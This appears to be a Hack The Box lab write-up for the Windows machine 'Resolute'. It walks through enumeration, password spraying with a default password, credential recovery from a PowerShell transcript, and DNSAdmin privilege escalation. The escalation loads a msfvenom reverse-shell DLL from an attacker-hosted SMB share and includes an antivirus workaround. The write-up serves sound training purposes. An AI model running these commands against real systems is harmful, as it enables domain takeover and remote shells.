@@ -1,0 +1,174 @@
+I"1/<p><strong><center>Ref°: HTB-06-Machine</center></strong></p>
+
+<p>— Resolute is a Windows machine that highlights the danger of default passwords that have not been changed and the recovery of an overly verbose powershell session record.</p>
+
+<p>A privilege escalation is possible with DNSAdmin group. We abuse of membership ryan to gain Administrator right through the possitiblity to inject a malicious DLL in the config of DNS.</p>
+
+<p><img src="/assets/images/resolute/HTB-Information-Resolute.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+
+<p>We find interesting services ; <code class="language-plaintext highlighter-rouge">dns</code>, <code class="language-plaintext highlighter-rouge">kerberos</code>, <code class="language-plaintext highlighter-rouge">ldap</code> and <code class="language-plaintext highlighter-rouge">smb</code> on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.169 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="enum4linux">enum4linux</h3>
+<hr />
+
+<p>Enum4linux is a tool for enumerating information from Windows and Samba systems.</p>
+
+<p>We find many users : <code class="language-plaintext highlighter-rouge">Administrator, Guest, krbtgt, ryan, marko, sunita, abigail, marcus, sally, fred, angela, felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per, claude, melanie, zach, simon, naoki</code></p>
+
+<p>And one (marko) with password in description : <strong>Welcome123!</strong></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>enum4linux 10.10.10.169
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-enum4linux.png" alt="Desktop View" /></p>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+
+<p>We have much possitiblity to exploit Active-Directory Machine.</p>
+
+<p>Reference - Active-Directory exploit toolbox : <a href="https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md">https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md</a></p>
+
+<p>Here we have password appear in description of user and are going to exploit it. But the password doesnt match with the user associated (marko). In this situation we can think about a <code class="language-plaintext highlighter-rouge">default password</code> on the creation of user.</p>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="using-lazy-password">Using Lazy Password</h3>
+<hr />
+
+<p>We can test default password on all users found above through <code class="language-plaintext highlighter-rouge">smb_login module</code> present in <code class="language-plaintext highlighter-rouge">Metasploit</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>search smb_login
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use auxiliary/scanner/smb/smb_login
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>SMBPass Welcome123!
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>USER_FILE /root/Documents/writeups/resolute/userfile.txt
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 10.10.10.169
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+
+<p>We result the user who always uses the default password.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Success: 'MEGABANK.LOCAL\melanie:Welcome123!'
+</span></code></pre></div></div>
+
+<p>We can connect now with <code class="language-plaintext highlighter-rouge">evil-winrm tool</code> and flag the user to validate the compromission of the system user.</p>
+
+<p>evil-winrm can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).</p>
+
+<p>WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.</p>
+
+<p>Reference - evil-winrm tool : <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-userflag.png" alt="Desktop View" /></p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="plaintext-password-from-transcript-powershell">Plaintext Password from transcript Powershell</h3>
+<hr />
+
+<p>We enum with Melanie account to find interesting user and success a lateral movement.</p>
+
+<p>Hidden folder named <code class="language-plaintext highlighter-rouge">PSTranscripts</code> is present under <code class="language-plaintext highlighter-rouge">c:\</code></p>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-pstranscript.png" alt="Desktop View" /></p>
+
+<p>We keep going down into it to find a Transcript Powershell.</p>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-hiddenfile.png" alt="Desktop View" /></p>
+
+<p>This file is the result of record part of a PowerShell session seem realized by Ryan user. We watching his password in a powershell command : <strong>Serv3r4Admin4cc123</strong></p>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-openfile.png" alt="Desktop View" /></p>
+
+<p>Again we can now connect on the user ryan with evil-winrm tool.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ruby evil-winrm.rb <span class="nt">-i</span> 10.10.10.169 <span class="nt">-u</span> ryan <span class="nt">-p</span> <span class="s1">'Serv3r4Admin4cc123!'</span>
+</code></pre></div></div>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="dnsadmin---acls-abuse">DNSAdmin - ACLs abuse</h3>
+<hr />
+
+<p>Our user is member of <code class="language-plaintext highlighter-rouge">DNSAdmin group</code>. We can abuse his membership to escalate to Administrator rights and compromise the Active Directory domain through the loading of malicious DLL (payload reverse shell TCP) with SYSTEM privileges.</p>
+
+<p>Reference - exploit DNSADMIN : <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS c:\Users\ryan\Documents&gt;</span><span class="w"> </span><span class="nb">whoami</span> /groups
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-groups.png" alt="Desktop View" /></p>
+
+<h4 id="1---creation-of-malicious-dll">1 - Creation of Malicious DLL</h4>
+
+<p>We create our malicious DLL with msfvenom by integrating a reverse shell TCP pointing to my IP address of my attacking machine and port 443.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.114.159 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> dll <span class="o">&gt;</span> pwndnsadmin.dll
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-payload.png" alt="Desktop View" /></p>
+
+<h4 id="2---share-malicious-dll">2 - Share Malicious DLL</h4>
+
+<p>We share our DLL from impact-server on our attacking machine. If we put manually the DLL through evil-winrm, he is delete directly. Maybe AV detect the payload ? So we bypass it to share from smbserver method.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>impacket-smbserver share /home/pcw3r/Documents/writeups/htb/resolute/
+</code></pre></div></div>
+
+<h4 id="3---injection-of-malicious-dll">3 - Injection of Malicious DLL</h4>
+
+<p>We inject our malicious DLL as config for DNS.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS c:\Users\ryan\Documents&gt;</span><span class="w"> </span>dnscmd.exe /config /serverlevelplugindll <span class="se">\\</span>10.10.14.159<span class="se">\s</span>hare<span class="se">\p</span>wndnsadmin.dll
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-injectdll.png" alt="Desktop View" /></p>
+
+<p>We confirm the adding of the value in regedit.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS c:\Users\ryan\Documents&gt;</span><span class="w"> </span>Get-ItemProperty HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\D</span>NS<span class="se">\P</span>arameters<span class="se">\ </span><span class="nt">-Name</span> serverlevelplugindll
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-verifpayload.png" alt="Desktop View" /></p>
+
+<h4 id="4---attacking-machine-listening">4 - Attacking machine listening</h4>
+
+<p>We listening on port 443 with netcat pending the execution of the payload.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 443
+</code></pre></div></div>
+
+<h4 id="5---execution-of-payload">5 - Execution of payload</h4>
+
+<p>dns .exe run under SYTEM privilege. The payload will execute when the service dns restart. This service run under SYSTEM privilege so we will dispose of this right through our attacking machine’s listening port 443.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS c:\Users\ryan\Documents&gt;</span><span class="w"> </span>sc.exe stop dns
+<span class="gp">PS c:\Users\ryan\Documents&gt;</span><span class="w"> </span>sc.exe start dns
+</code></pre></div></div>
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-exploitdll.png" alt="Desktop View" /></p>
+
+<p>We get full control of Resolute machine.</p>
+
+<h3 id="flag-root">Flag root</h3>
+<hr />
+
+<p><img src="/assets/images/resolute/HTB-Images-Resolute-rootflag.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>When you get really smart people together, who are super motivated by the problem that they’re working on, I think people will figure out the answers.</strong></p>
+
+  <p>Katie Bouman</p>
+</blockquote>
+:ET
